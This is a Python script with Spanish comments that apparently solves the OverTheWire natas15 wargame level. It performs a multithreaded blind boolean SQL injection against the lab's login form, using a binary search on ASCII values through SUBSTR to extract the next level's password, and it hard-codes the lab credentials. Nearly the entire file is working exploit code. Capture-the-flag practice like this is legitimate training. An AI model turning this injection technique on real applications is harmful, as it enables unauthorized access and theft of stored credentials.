import requests
import string
import sys
import time
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURACIÓN ---
URL = 'http://natas15.natas.labs.overthewire.org/'
AUTH = ('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')
CHARSET = sorted(string.ascii_letters + string.digits)
THREADS = 10 
TOTAL_REQUESTS = 0 # Contador global de peticiones

def check_condition(payload):
    """Envía la petición y registra el conteo global."""
    global TOTAL_REQUESTS
    TOTAL_REQUESTS += 1
    try:
        r = requests.post(URL, auth=AUTH, data={'username': payload}, timeout=5)
        return "This user exists." in r.text
    except:
        return False

def get_char_at_index(index):
    """Búsqueda binaria para encontrar el carácter en la posición 'index'."""
    low = 0
    high = len(CHARSET) - 1
    found_char = None

    while low <= high:
        mid = (low + high) // 2
        char_mid = CHARSET[mid]
        
        # Comparación ASCII para búsqueda binaria
        payload = f'natas16" AND BINARY ASCII(SUBSTR(password,{index},1)) > {ord(char_mid)}-- -'
        
        if check_condition(payload):
            low = mid + 1
        else:
            found_char = char_mid
            high = mid - 1
            
    if found_char:
        verify = f'natas16" AND BINARY SUBSTR(password,{index},1) = "{found_char}"-- -'
        if check_condition(verify):
            return (index, found_char)
    return (index, None)

def main():
    start_time = time.time() # --- INICIO DEL CRONÓMETRO ---
    
    print(f"[*] Iniciando Multi-threaded Pwn (Threads: {THREADS})")
    print(f"[*] Objetivo: {URL}")
    print("-" * 50)

    password_map = {}
    max_length = 32 
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(get_char_at_index, i) for i in range(1, max_length + 1)]
        
        for future in futures:
            index, char = future.result()
            if char:
                password_map[index] = char
                # Reconstrucción visual en tiempo real
                current_pw = "".join([password_map.get(i, ".") for i in range(1, max_length + 1)])
                sys.stdout.write(f"\r[+] Extrayendo: {current_pw}")
                sys.stdout.flush()

    # --- CÁLCULO DE ESTADÍSTICAS ---
    end_time = time.time()
    duration = end_time - start_time
    final_password = "".join([password_map.get(i, "") for i in range(1, max_length + 1)])

    print(f"\n\n[!] Password Final: {final_password}")
    print("-" * 50)
    print(f"[*] ESTADÍSTICAS DE EJECUCIÓN")
    print(f"[*] Tiempo transcurrido: {duration:.2f} segundos")
    print(f"[*] Peticiones totales:  {TOTAL_REQUESTS}")
    print(f"[*] Velocidad promedio:  {TOTAL_REQUESTS / duration:.2f} req/s")
    print("-" * 50)

if __name__ == '__main__':
    main()